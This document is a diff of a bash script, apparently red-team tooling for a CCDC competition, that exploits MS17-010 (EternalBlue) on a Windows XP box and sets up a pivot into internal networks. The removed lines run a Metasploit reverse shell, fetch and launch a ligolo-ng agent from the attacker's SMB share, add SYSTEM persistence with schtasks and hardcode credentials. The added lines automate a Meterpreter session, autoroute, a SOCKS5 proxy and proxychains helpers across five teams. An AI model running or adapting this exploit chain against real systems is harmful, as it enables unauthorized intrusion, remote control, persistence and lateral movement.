@@ -1,154 +1,274 @@
 #!/bin/bash
 # ================================================
-# CCDC EternalBlue + ligolo-ng Auto-Deploy (XP Adventure Box)
-# Usage: ./eternalblue_ligolo.sh <team_number> [attacker_ip]
-# Completely credential-less — survives full cred rotation
+# CCDC EternalBlue Meterpreter + Proxychains (Adventure XP Box)
+# Usage: ./ligo.sh <team | all> [attacker_ip] [-l lport] [-s socks_port]
+#
+# Exploits MS17-010 on the Adventure XP box (.72) to get a
+# Meterpreter session, sets up SOCKS proxy via autoroute,
+# then generates a proxychains config + helper script per team.
+#
+# The XP box becomes the primary pivot into the 172.16.x.x
+# internal network — no credentials needed.
+#
+# SOCKS port defaults to 109<TEAM> (e.g. 1095 for team 5).
+# pivot.sh uses 108<TEAM> for Sliver — no conflict.
+#
+# Supports "all" to exploit teams 1-5 sequentially.
 # ================================================
 
-if [[ $# -lt 1 ]]; then
-  echo "Usage: $0 <team> [attacker_ip]"
-  exit 1
-fi
+set -uo pipefail
 
-TEAM="$1"
-ATTACKER_IP="${2:-$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1)}"
-TARGET="192.168.20${TEAM}.72"
-LPORT=4444
-DOMAIN="aperturesciencelabs.org"
-
-echo "[+] ================================================"
-echo "[+] EternalBlue + ligolo-ng on Adventure XP (team ${TEAM})"
-echo "[+] Target: ${TARGET} | Attacker: ${ATTACKER_IP}"
-echo "[+] ================================================"
-
-# 1. Start ligolo proxy (background)
-echo "[+] Starting ligolo-ng proxy on 443..."
-nohup ./ligolo-ng proxy -selfcert -laddr 0.0.0.0:443 > ligolo_proxy.log 2>&1 &
-sleep 2
-
-# 2. Start SMB share with the agent (impacket)
-echo "[+] Starting SMB share 'SHARE' with agent.exe..."
-impacket-smbserver SHARE . -smb2support -port 445 > smbserver.log 2>&1 &
-sleep 2
-
-# 3. Launch EternalBlue with reverse shell (Metasploit — most reliable for XP)
-echo "[+] Launching EternalBlue exploit (reverse shell to ${ATTACKER_IP}:${LPORT})..."
-cat > eternalblue.rc << EOF
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS ${TARGET}
-set PAYLOAD windows/x86/shell_reverse_tcp
-set LHOST ${ATTACKER_IP}
-set LPORT ${LPORT}
-set TARGET 0
-exploit -j
-EOF
-
-msfconsole -q -r eternalblue.rc > msf.log 2>&1 &
-
-# Start listener in background
-echo "[+] Starting netcat listener on ${LPORT}..."
-nc -lvnp ${LPORT} > reverse_shell.log 2>&1 &
-
-echo ""
-echo "[+] ================================================"
-echo "[+] WAIT FOR THE REVERSE SHELL (check nc window)"
-echo "[+] When you get the shell (cmd.exe), PASTE THESE COMMANDS:"
-echo "[+] ================================================"
-echo ""
-echo "net use Z: \\\\${ATTACKER_IP}\\SHARE"
-echo "copy Z:\\agent.exe C:\\Windows\\Temp\\agent.exe"
-echo "C:\\Windows\\Temp\\agent.exe -connect ${ATTACKER_IP}:443 -ignore-cert"
-echo ""
-echo "After the agent connects, in a NEW terminal run:"
-echo "   ./ligolo-ng proxy -selfcert -laddr 0.0.0.0:443"
-echo "Then in ligolo console:"
-echo "   list"
-echo "   session 1"
-echo "   tunnel_start"
-echo "   addroute 172.16.0.0/16"
-echo ""
-echo "[+] The agent will survive reboots if you later add:"
-echo "   schtasks /create /tn Ligolo /tr \"C:\\Windows\\Temp\\agent.exe -connect ${ATTACKER_IP}:443 -ignore-cert\" /sc onstart /ru SYSTEM /f"
-echo ""
-echo "The cake is a lie… but EternalBlue + ligolo is forever."
-
-#!/bin/bash
-# ================================================
-# CCDC ligolo-ng Auto-Deploy on Adventure (XP box)
-# Usage: ./deploy_ligolo.sh <team_number> [attacker_ip]
-#   - Deploys to 192.168.20<TEAM>.72 (Adventure)
-#   - Starts ligolo proxy on port 443 (background)
-#   - Uploads + executes agent via SMB + psexec (works on XP)
-#   - Uses chell:Th3cake1salie! by default (or PortalGod with -k later)
-# ================================================
-
-if [[ $# -lt 1 ]]; then
-  echo "Usage: $0 <team> [attacker_ip]"
-  echo "   e.g. $0 5"
-  echo "   e.g. $0 5 10.10.13.37"
-  exit 1
-fi
-
-TEAM="$1"
-ATTACKER_IP="${2:-$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1)}"
-DOMAIN="aperturesciencelabs.org"
-USER="chell"
-PASS="Th3cake1salie!"
-TARGET_IP="192.168.20${TEAM}.72"
-AGENT="./agent.exe"          # ← Put your Windows agent here (rename ligolo-ng_agent_*_windows_amd64.exe → agent.exe)
-PROXY_CMD="./ligolo-ng proxy" # or full path to ligolo-ng_proxy_linux_amd64
-
-echo "[+] ================================================"
-echo "[+] Deploying ligolo-ng on Adventure (team ${TEAM})"
-echo "[+] Target: ${TARGET_IP} | Attacker: ${ATTACKER_IP}:443"
-echo "[+] ================================================"
-
-# 1. Start ligolo proxy in background (if not already running)
-if ! ss -tlnp | grep -q ":443"; then
-  echo "[+] Starting ligolo-ng proxy (port 443) in background..."
-  nohup ${PROXY_CMD} -selfcert -laddr 0.0.0.0:443 > ligolo_proxy.log 2>&1 &
-  sleep 3
-  echo "[+] Proxy PID: $!"
-else
-  echo "[+] ligolo proxy already listening on 443"
-fi
-
-# 2. Upload agent via SMB (C$ share — works perfectly on XP)
-echo "[+] Uploading agent.exe to C:\\Windows\\Temp\\..."
-smbclient //${TARGET_IP}/C\$ -U "${DOMAIN}/${USER}%${PASS}" -c "put ${AGENT} Windows\\Temp\\agent.exe" || {
-  echo "[-] SMB upload failed — check creds/connectivity"
+usage() {
+  echo "Usage: $0 <team | all> [attacker_ip] [-l lport] [-s socks_port]"
+  echo ""
+  echo "Flags:"
+  echo "  -l PORT  Meterpreter reverse shell listen port (default: 4440+team)"
+  echo "  -s PORT  SOCKS5 proxy port (default: 109<team>, e.g. 1095 for team 5)"
+  echo ""
+  echo "Examples:"
+  echo "  $0 5                         # exploit team 5 XP box"
+  echo "  $0 all                       # exploit teams 1-5"
+  echo "  $0 5 10.10.13.37             # specify attacker IP"
+  echo "  $0 5 -l 5555                 # custom rev shell port"
+  echo "  $0 5 10.10.13.37 -l 5555 -s 2080  # custom everything"
   exit 1
 }
 
-# 3. Execute agent via psexec (reverse connect)
-echo "[+] Launching ligolo-ng agent (reverse tunnel)..."
-impacket-psexec "${DOMAIN}/${USER}:${PASS}@${TARGET_IP}" \
-  "C:\\Windows\\Temp\\agent.exe -connect ${ATTACKER_IP}:443 -ignore-cert" \
-  2>&1 | tail -n 20
+if [[ $# -lt 1 ]]; then usage; fi
 
-echo ""
-echo "[+] ================================================"
-echo "[+] DEPLOYMENT COMPLETE — NOW CONFIGURE THE TUNNEL"
-echo "[+] ================================================"
-echo ""
-echo "1. Open a NEW terminal and attach to the proxy console:"
-echo "   ./ligolo-ng proxy -selfcert -laddr 0.0.0.0:443"
-echo ""
-echo "2. In the ligolo-ng console type these commands:"
-echo "   > list                  # see the Adventure agent"
-echo "   > session 1             # select the agent (or whatever ID it shows)"
-echo "   > tunnel_start"
-echo "   > addroute 172.16.0.0/16"
-echo "   > ifconfig              # you should see ligolo0 interface with an IP"
-echo ""
-echo "3. You now have FULL internal access:"
-echo "   ping 172.16.3.140       # curiosity DC"
-echo "   ping 172.16.1.10        # morality"
-echo "   evil-winrm -i 172.16.1.11 -u PortalGod -p ''"
-echo "   proxychains4 crackmapexec smb 172.16.3.140 ..."
-echo ""
-echo "[+] Pro tip: Add more routes with 'addroute 172.16.1.0/24' etc."
-echo "[+] The tunnel survives reboots if you add persistence (schtasks) later."
-echo "[+] XP note: If agent.exe crashes (old OS), use rpivot.exe instead — same process."
-echo ""
-echo "The cake is a lie… but your internal TUN is forever."
+ARG="$1"; shift
+
+# Grab optional positional attacker_ip (before any flags)
+ATTACKER_IP=""
+if [[ $# -gt 0 && "$1" != -* ]]; then
+  ATTACKER_IP="$1"; shift
+fi
+
+# Parse optional flags
+CUSTOM_LPORT=""
+CUSTOM_SOCKS=""
+while getopts "l:s:" opt; do
+  case "$opt" in
+    l) CUSTOM_LPORT="$OPTARG" ;;
+    s) CUSTOM_SOCKS="$OPTARG" ;;
+    *) usage ;;
+  esac
+done
+
+# Auto-detect attacker IP if not provided
+if [[ -z "$ATTACKER_IP" ]]; then
+  ATTACKER_IP="$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -n1)"
+fi
+
+DOMAIN="aperturesciencelabs.org"
+
+# Internal subnets reachable through the XP pivot
+INTERNAL_SUBNETS=("172.16.1.0/24" "172.16.2.0/24" "172.16.3.0/24")
+
+# ====================== INTERNAL HOST MAP ======================
+# hostname → internal IP (same across all teams)
+declare -A INTERNAL_IP=(
+  ["schrodinger_dmz"]="172.16.1.1"
+  ["schrodinger_internal"]="172.16.2.1"
+  ["schrodinger_workstation"]="172.16.3.1"
+  ["curiosity"]="172.16.3.140"
+  ["morality"]="172.16.1.10"
+  ["intelligence"]="172.16.1.11"
+  ["anger"]="172.16.2.70"
+  ["fact"]="172.16.2.71"
+  ["space"]="172.16.3.141"
+  ["adventure"]="172.16.2.72"
+)
+
+# ====================== EXPLOIT ONE TEAM ======================
+exploit_team() {
+  local TEAM="$1"
+  local TARGET="192.168.20${TEAM}.72"
+  local SOCKS_PORT="${CUSTOM_SOCKS:-109${TEAM}}"
+  local LPORT="${CUSTOM_LPORT:-$((4440 + TEAM))}"
+
+  echo ""
+  echo "[+] ================================================"
+  echo "[+] EternalBlue → TEAM ${TEAM} | Adventure XP (${TARGET})"
+  echo "[+] Attacker: ${ATTACKER_IP} | LPORT: ${LPORT}"
+  echo "[+] SOCKS5 will be on 127.0.0.1:${SOCKS_PORT}"
+  echo "[+] ================================================"
+
+  # Check for port conflicts (pivot.sh uses 108<TEAM>, warn if our port clashes)
+  if ss -tlnp 2>/dev/null | grep -q ":${SOCKS_PORT} "; then
+    echo "[!] WARNING: Port ${SOCKS_PORT} is already in use!"
+    echo "    Another pivot (pivot.sh/ligo.sh) may be running on this port."
+    echo "    Use -s <port> to pick a different SOCKS port."
+    echo ""
+    read -rp "    Continue anyway? [y/N] " ans
+    [[ "${ans,,}" != "y" ]] && { echo "[-] Aborted."; return 1; }
+  fi
+  if ss -tlnp 2>/dev/null | grep -q ":${LPORT} "; then
+    echo "[!] WARNING: LPORT ${LPORT} is already in use!"
+    echo "    Use -l <port> to pick a different reverse shell port."
+    echo ""
+    read -rp "    Continue anyway? [y/N] " ans
+    [[ "${ans,,}" != "y" ]] && { echo "[-] Aborted."; return 1; }
+  fi
+
+  # Check target reachable on 445
+  if ! timeout 3 bash -c "echo >/dev/tcp/${TARGET}/445" 2>/dev/null; then
+    echo "[-] Cannot reach ${TARGET}:445 — skipping team ${TEAM}"
+    return 1
+  fi
+  echo "[+] Target reachable on SMB"
+
+  # Generate Metasploit resource file
+  local RC_FILE="ligo_team${TEAM}.rc"
+  cat > "$RC_FILE" << EOF
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS ${TARGET}
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST ${ATTACKER_IP}
+set LPORT ${LPORT}
+set TARGET 0
+set AutoRunScript "multi_console_command -cl 'run post/multi/manage/autoroute SUBNET=172.16.0.0 NETMASK=255.255.0.0','run auxiliary/server/socks_proxy VERSION=5 SRVPORT=${SOCKS_PORT} SRVHOST=127.0.0.1'"
+exploit -j -z
+EOF
+
+  echo "[+] Generated ${RC_FILE}"
+  echo "[*] Launching Metasploit (backgrounded)..."
+  msfconsole -q -r "$RC_FILE" &
+  local MSF_PID=$!
+
+  # Wait for SOCKS proxy to come up (poll for up to 60s)
+  echo "[*] Waiting for SOCKS5 proxy on 127.0.0.1:${SOCKS_PORT}..."
+  local waited=0
+  while ! ss -tlnp 2>/dev/null | grep -q ":${SOCKS_PORT}" && [[ $waited -lt 60 ]]; do
+    sleep 3
+    ((waited+=3))
+  done
+
+  if ss -tlnp 2>/dev/null | grep -q ":${SOCKS_PORT}"; then
+    echo "[+] SOCKS5 proxy is UP on 127.0.0.1:${SOCKS_PORT}"
+  else
+    echo "[!] SOCKS5 not detected yet — Metasploit may still be exploiting"
+    echo "    Check the msfconsole window. Once you get a session, run manually:"
+    echo "    run post/multi/manage/autoroute SUBNET=172.16.0.0 NETMASK=255.255.0.0"
+    echo "    run auxiliary/server/socks_proxy VERSION=5 SRVPORT=${SOCKS_PORT} SRVHOST=127.0.0.1"
+  fi
+
+  # ---- Generate proxychains config ----
+  local PC_CONF="proxychains_team${TEAM}.conf"
+  cat > "$PC_CONF" << EOF
+# Proxychains config for Team ${TEAM}
+# SOCKS5 via Meterpreter autoroute on Adventure XP pivot
+strict_chain
+proxy_dns
+remote_dns_subnet 224
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+
+[ProxyList]
+socks5 127.0.0.1 ${SOCKS_PORT}
+EOF
+
+  echo "[+] Created ${PC_CONF}"
+
+  # ---- Generate per-team helper script ----
+  local HELPER="team${TEAM}_proxy.sh"
+  cat > "$HELPER" << 'HELPER_HEADER'
+#!/bin/bash
+# ================================================
+# Team PROXYCHAINS_TEAM Proxychains Helper
+# Source this: source PROXYCHAINS_HELPER
+# Or run commands: ./PROXYCHAINS_HELPER <command>
+# ================================================
+HELPER_HEADER
+
+  # Replace placeholders with actual values
+  cat >> "$HELPER" << HELPER_BODY
+
+TEAM="${TEAM}"
+SOCKS_PORT="${SOCKS_PORT}"
+SCRIPT_DIR="\$(cd "\$(dirname "\${BASH_SOURCE[0]:-\$0}")" && pwd)"
+PC_CONF="\${SCRIPT_DIR}/${PC_CONF}"
+
+# Internal IP map
+declare -A HOST=(
+  ["schrodinger_dmz"]="172.16.1.1"
+  ["schrodinger_internal"]="172.16.2.1"
+  ["schrodinger_workstation"]="172.16.3.1"
+  ["curiosity"]="172.16.3.140"
+  ["morality"]="172.16.1.10"
+  ["intelligence"]="172.16.1.11"
+  ["anger"]="172.16.2.70"
+  ["fact"]="172.16.2.71"
+  ["space"]="172.16.3.141"
+  ["adventure"]="172.16.2.72"
+)
+
+if [[ "\${BASH_SOURCE[0]}" == "\${0}" ]]; then
+  # Called as a script — proxy the given command
+  if [[ \$# -eq 0 ]]; then
+    echo "Usage: \$0 <command> [args...]"
+    echo "  e.g. \$0 netexec smb 172.16.3.140 -u Administrator -p 'pass'"
+    echo ""
+    echo "Or source this file to get aliases:"
+    echo "  source \$0"
+    echo ""
+    echo "Internal hosts:"
+    for h in curiosity morality intelligence anger fact space adventure; do
+      printf "  %-15s %s\n" "\$h" "\${HOST[\$h]}"
+    done
+    exit 0
+  fi
+  exec proxychains4 -q -f "\$PC_CONF" "\$@"
+else
+  # Sourced — set up aliases
+  alias pc${TEAM}="proxychains4 -q -f \${PC_CONF}"
+  alias p${TEAM}="proxychains4 -q -f \${PC_CONF}"
+
+  # Convenience: export the config path
+  export PROXYCHAINS_TEAM${TEAM}_CONF="\${PC_CONF}"
+
+  echo "[+] Team ${TEAM} proxychains aliases ready:"
+  echo "    pc${TEAM} <command>        — run anything through the pivot"
+  echo "    p${TEAM} <command>         — shorthand"
+  echo ""
+  echo "    Internal hosts:"
+  for h in curiosity morality intelligence anger fact space adventure; do
+    printf "      %-15s %s\n" "\$h" "\${HOST[\$h]}"
+  done
+fi
+HELPER_BODY
+
+  chmod +x "$HELPER"
+  echo "[+] Created ${HELPER}"
+  echo ""
+  echo "[+] ================================================"
+  echo "[+] TEAM ${TEAM} PIVOT READY"
+  echo "[+] ================================================"
+  echo ""
+  echo "  Quick start:"
+  echo "    source ${HELPER}                    # get pc${TEAM}/p${TEAM} aliases"
+  echo "    pc${TEAM} netexec smb 172.16.3.140  # hit the DC"
+  echo "    pc${TEAM} evil-winrm -i 172.16.1.10 -u Administrator -p 'pass'"
+  echo ""
+  echo "  Or use -x flag on other scripts to use internal IPs through proxychains:"
+  echo "    proxychains4 -q -f ${PC_CONF} ./exec.sh ${TEAM} -x curiosity"
+  echo "    proxychains4 -q -f ${PC_CONF} ./spray.sh ${TEAM} -x"
+  echo ""
+}
+
+# ====================== MAIN ======================
+if [[ "$ARG" == "all" || "$ARG" == "All" ]]; then
+  echo "[*] Exploiting ALL teams (1-5)..."
+  for t in {1..5}; do
+    exploit_team "$t"
+  done
+  echo ""
+  echo "[*] All teams processed."
+  echo "[*] Helper scripts: team1_proxy.sh .. team5_proxy.sh"
+else
+  if ! [[ "$ARG" =~ ^[0-9]+$ ]]; then
+    echo "[-] Invalid team number"
+    exit 1
+  fi
+  exploit_team "$ARG"
+fi
